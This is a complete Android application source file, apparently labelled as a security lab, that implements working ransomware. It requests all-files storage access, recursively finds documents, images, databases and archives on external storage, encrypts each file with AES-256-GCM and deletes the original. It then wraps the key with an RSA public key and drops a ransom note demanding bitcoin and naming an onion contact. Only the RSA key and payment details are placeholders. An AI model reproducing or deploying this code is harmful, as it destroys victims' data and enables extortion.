package com.security.lab;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.widget.TextView;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.KeyFactory;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.spec.X509EncodedKeySpec;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;

public class MainActivity extends Activity {

    // Public RSA key (replace with real PEM for actual use)
    private static final String RSA_PUB_PEM =
        "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr...REPLACE...IDAQAB";

    private TextView log;

    @Override
    public void onCreate(Bundle state) {
        super.onCreate(state);
        log = new TextView(this);
        log.setPadding(32, 48, 32, 32);
        setContentView(log);

        requestAllFilesAccess();
    }

    // Request MANAGE_EXTERNAL_STORAGE on Android 11+
    private void requestAllFilesAccess() {
        if (Build.VERSION.SDK_INT >= 30 &&
            !Environment.isExternalStorageManager()) {
            Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
            i.setData(Uri.parse("package:" + getPackageName()));
            startActivity(i);
            log.setText("Grant all-files access, then reopen app.");
            return;
        }
        runEncryption();
    }

    private void runEncryption() {
        new Thread(() -> {
            try {
                SecretKey aes = genAesKey();
                byte[] rsaWrapped = rsaWrap(aes.getEncoded());

                File root = Environment.getExternalStorageDirectory();
                List<File> targets = new ArrayList<>();
                collect(root, targets);

                int done = 0;
                for (File f : targets) {
                    try {
                        encryptFile(f, aes);
                        done++;
                    } catch (Exception ignored) {}
                }

                // Ransom note + encrypted AES key
                File note = new File(root, "READ_ME_RANSOM.txt");
                writeNote(note, rsaWrapped);

                final int total = done;
                runOnUiThread(() -> log.setText(
                    "Encrypted: " + total + " files\nNote: " + note.getAbsolutePath()));
            } catch (Exception e) {
                runOnUiThread(() -> log.setText("ERR: " + e));
            }
        }).start();
    }

    // Recursive file collection by extension
    private void collect(File dir, List<File> out) {
        File[] list = dir.listFiles();
        if (list == null) return;
        for (File f : list) {
            if (f.isDirectory()) {
                if (f.getName().equals("Android")) continue; // skip system dir
                collect(f, out);
            } else if (isTarget(f.getName())) {
                out.add(f);
            }
        }
    }

    private static boolean isTarget(String n) {
        String[] ext = {".txt",".pdf",".doc",".docx",".jpg",".jpeg",".png",
                        ".db",".sql",".xls",".xlsx",".mp4",".zip",".csv"};
        String lower = n.toLowerCase();
        for (String e : ext) if (lower.endsWith(e)) return true;
        return false;
    }

    // AES-256-GCM: iv(12) + tag(16) + ciphertext, tag added automatically
    private void encryptFile(File in, SecretKey key) throws Exception {
        if (in.getName().endsWith(".enc")) return;
        FileInputStream fis = new FileInputStream(in);
        byte[] plain = new byte[(int) in.length()];
        int r = fis.read(plain);
        fis.close();

        byte[] iv = new byte[12];
        new SecureRandom().nextBytes(iv);

        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        c.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
        byte[] ct = c.doFinal(plain);

        File out = new File(in.getAbsolutePath() + ".enc");
        FileOutputStream fos = new FileOutputStream(out);
        fos.write(iv);
        fos.write(ct);
        fos.close();
        in.delete();
    }

    // AES-256 key generation
    private static SecretKey genAesKey() throws Exception {
        KeyGenerator kg = KeyGenerator.getInstance("AES");
        kg.init(256);
        return kg.generateKey();
    }

    // RSA-OAEP wrap of AES key with public key
    private byte[] rsaWrap(byte[] aesKey) throws Exception {
        byte[] der = Base64.getDecoder().decode(RSA_PUB_PEM);
        PublicKey pub = KeyFactory.getInstance("RSA")
                .generatePublic(new X509EncodedKeySpec(der));
        Cipher rsa = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
        rsa.init(Cipher.ENCRYPT_MODE, pub);
        return rsa.doFinal(aesKey);
    }

    // Note + wrapped key in base64
    private void writeNote(File note, byte[] wrapped) throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("YOUR FILES ARE ENCRYPTED.\n");
        sb.append("Pay 0.05 BTC to: bc1qexampleaddressxxxxxxxxxxxxx\n");
        sb.append("Send proof to: example.onion\n\n");
        sb.append("Wrapped AES key (base64):\n");
        sb.append(Base64.getEncoder().encodeToString(wrapped));
        sb.append("\n");
        FileOutputStream fos = new FileOutputStream(note);
        fos.write(sb.toString().getBytes());
        fos.close();
    }
}
